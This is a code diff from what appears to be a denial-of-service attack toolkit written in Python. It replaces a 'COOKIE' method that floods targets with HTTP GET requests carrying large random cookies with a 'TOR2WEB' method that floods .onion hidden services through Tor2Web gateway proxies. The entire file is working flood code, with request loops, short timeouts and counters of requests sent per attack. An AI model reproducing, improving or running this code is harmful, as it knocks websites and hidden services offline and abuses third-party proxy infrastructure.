@@ -18,65 +18,44 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 '''
 
-#                .---. .---.
-#               :     : o   :    me want cookie!
-#           _..-:   o :     :-.._    /
-#       .-''  '  `---' `---' "   ``-.
-#     .'   "   '  "  .    "  . '  "  `.
-#    :   '.---.,,.,...,.,.,.,..---.  ' ;
-#    `. " `.                     .' " .'
-#     `.  '`.                   .' ' .'
-#      `.    `-._           _.-' "  .'  .----.
-#        `. "    '"--...--"'  . ' .'  .'  o   `.
-#        .'`-._'    " .     " _.-'`. :       o  :
-#  jgs .'      ```--.....--'''    ' `:_ o       :
-#    .'    "     '         "     "   ; `.;";";";'
-#   ;         '       "       '     . ; .' ; ; ;
-#  ;     '         '       '   "    .'      .-'
-#  '  "     "   '      "           "    _.-'
-
 import time, requests
 
 from src.core import Core
 from src.utils import *
 from src.useragent import *
-from random import randint
 
 def flood(attack_id, url, stoptime) -> None:
+
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
             continue
         
         try:
 
-            headers = utils().buildheaders(url)
-            headers['Cookie'] = utils().randstr(randint(3072, 4096), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890')
-
+            target_url = url.replace('.onion', f'.{utils().tor_gateway()}')
             Core.session.get(
-                utils().buildblock(url),
-                headers=headers,
+                url=utils().buildblock(target_url), 
+                headers=utils().buildheaders(target_url),
                 verify=False, 
-                timeout=(5,1), 
+                timeout=(5,0.1), 
                 allow_redirects=False,
                 stream=False,
-                cert=None,
-                proxies=utils().get_proxy()
+                cert=None
             )
 
             Core.infodict[attack_id]['req_sent'] += 1
         except requests.exceptions.ReadTimeout:
             Core.infodict[attack_id]['req_sent'] += 1
 
-        except Exception as e:
-            print(e)
+        except Exception:
             Core.infodict[attack_id]['req_fail'] += 1
 
         Core.infodict[attack_id]['req_total'] += 1
     Core.threadcount -= 1
 
 Core.methods.update({
-    'COOKIE': {
-        'info': 'HTTP GET flood with large cookies, tasty!',
+    'TOR2WEB': {
+        'info': 'HTTP GET flood abusing Tor 2 Web proxies',
         'func': flood
     }
 })
